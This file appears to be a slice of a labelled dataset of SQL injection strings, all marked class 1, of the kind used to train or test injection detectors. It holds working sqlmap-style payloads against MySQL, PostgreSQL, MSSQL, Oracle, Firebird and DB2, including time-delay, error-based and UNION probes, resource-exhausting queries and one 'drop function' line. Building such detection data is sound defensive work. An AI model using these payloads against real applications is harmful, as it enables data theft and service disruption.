index,payload,class
4591,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",1
4592,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui",1
4593,1'   )    )     )   rlike   (  select   (  case when   (  5524  =  9582  )   then 1 else 0x28 end   )    )    and    (    (     (  'okoj' like 'okoj,1
4594,"-1337""  )   union all select 7508--",1
4595,"-2722""  )   or 4907  =  8126#",1
4596,"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""ardk"" like ""ardk",1
4597,"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1
4598,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg",1
4599,"1%""  )   union all select null#",1
4600,1'||  (  select 'gnil' from dual where 7552  =  7552 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',1
4601,1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
4602,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr,1
4603,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",1
4604,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",1
4605,-5211 union all select 1754--,1
4606,"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",1
4607,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",1
4608,"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'kqip' like 'kqip",1
4609,"-9054""  )   as rgyu where 3792  =  3792 order by 1--",1
4610,-6766'   )    )     )   or 3038  =  3038,1
4611,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'yqrt' like 'yqrt",1
4612,1  )   as vqdh where 1603  =  1603,1
4613,"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'yiem'  =  'yiem",1
4614,"1%""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
4615,"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",1
4616,"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",1
4617,"1"" where 5250  =  5250",1
4618,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",1
4619, (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,1
4620,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1
4621,"-2962'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'hkjo'  =  'hkjo",1
4622,1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,1
4623,"1%""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
4624,1' where 3337  =  3337 and 8403  =  5760,1
4625,"1"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
4626,"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
4627,"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""vurb"" like ""vurb",1
4628,1  )   where 8094  =  8094,1
4629,"1%'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
4630, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'jirc'  =  'jirc,1
4631,"1'+  (  select 'ples' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",1
4632,"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1
4633,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf",1
4634,if  (  8574  =  7534  )   select 8574 else drop function nxbe--,1
4635,1'  )   and 7533  =  7533,1
4636,"1  )   union all select null,null,null,null--",1
4637,1'||  (  select 'scct' where 2587  =  2587 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',1
4638,-6449'   )    )    or 2590  =  2848,1
4639,1' where 3362  =  3362,1
4640,-1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh,1
4641,-8684' where 9820  =  9820 or 6844  =  5105,1
4642,"1%'   )    )     )   union all select null,null,null,null--",1
4643,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",1
4644,"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
4645,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1
4646,"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
4647,select sleep  (  5   )    )   +',1
4648,"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
4649, (  select   (  case when   (  3950  =  2747  )   then 1 else 1/  (  select 0  )   end   )    ) ,1
4650,"1%'  )   union all select null,null,null,null,null#",1
4651,select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,1
4652,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",1
4653,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'nqol'  =  'nqol,1
4654,"1%'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",1
4655,1' where 6168  =  6168,1
4656,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",1
4657,"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""nevr"" like ""nevr",1
4658,"-6772""   )    )    or 9323  =  9323#",1
4659,"1"" and   (  7597  =  8422  )  *8422 and ""gywp"" like ""gywp",1
4660,1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
4661,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",1
4662,"-3769""   )    )     )   union all select 8456#",1
4663,1'+  (  select 'vjoj' where 5348  =  5348,1
4664,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
4665,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,1
4666,-4828%'  )   or 8678  =  5745#,1
4667,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null#",1
4668,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",1
4669,"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",1
4670,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",1
4671,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1
4672,"1""  )   and 7533  =  7533 and   (  ""yqzq""  =  ""yqzq",1
4673,1   )    )    as vryv where 5600  =  5600,1
4674,"-5013'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'ehwh' like 'ehwh",1
4675,"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",1
4676,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dqis""  =  ""dqis",1
4677,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  1773  =  1773",1
4678,"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
4679,"1""   )    )    union all select null,null,null,null,null,null#",1
4680,1 where 3502  =  3502 order by 1--,1
4681,"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",1
4682,1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
4683,"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",1
4684,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
4685,"-3865'  )   union all select 4935,4935,4935,4935,4935--",1
4686,"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
4687,"1""",1
4688,1'+  (  select zwsr where 6567  =  6567,1
4689,1'  )   and 8404  =  8651#,1
4690,"1%"" and 4595  =  4595#",1
4691,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
4692,"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""kszu""  =  ""kszu",1
4693,"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
4694,"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",1
4695,"select count  (  *  )   from generate_series  (  1,5000000   )    )   +'",1
4696,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",1
4697,1%'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1
4698,"1   )    )    as jyfo where 8121  =  8121 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
4699,"1""   )    )    as gvpm where 5170  =  5170 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
4700,"1'+  (  select hsef where 4136  =  4136 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",1
4701,1'+  (  select 'mdiu' where 4443  =  4443,1
4702,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",1
4703,1'+  (  select 'wvqj' where 3709  =  3709,1
4704,1'+  (  select 'xpby' where 2724  =  2724,1
4705,1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'yhku' like 'yhku,1
4706,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
4707,"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1
4708,"1%'  )   union all select null,null--",1
4709,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",1
4710,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",1
4711,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo",1
4712,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",1
4713,end and    (    (     (  'nhub'  =  'nhub,1
4714,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",1
4715,1'   )    )    as sjzf where 9997  =  9997 and 4193  =  5408,1
4716,"-2032%""   )    )     )   or   (  3082  =  7155  )  *7155 and    (    (     (  ""%""  =  """,1
4717,"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
4718,"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1
4719,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,1
4720,"1'  )   as cgsz where 7194  =  7194 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
4721,"-4397'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'omqt'  =  'omqt",1
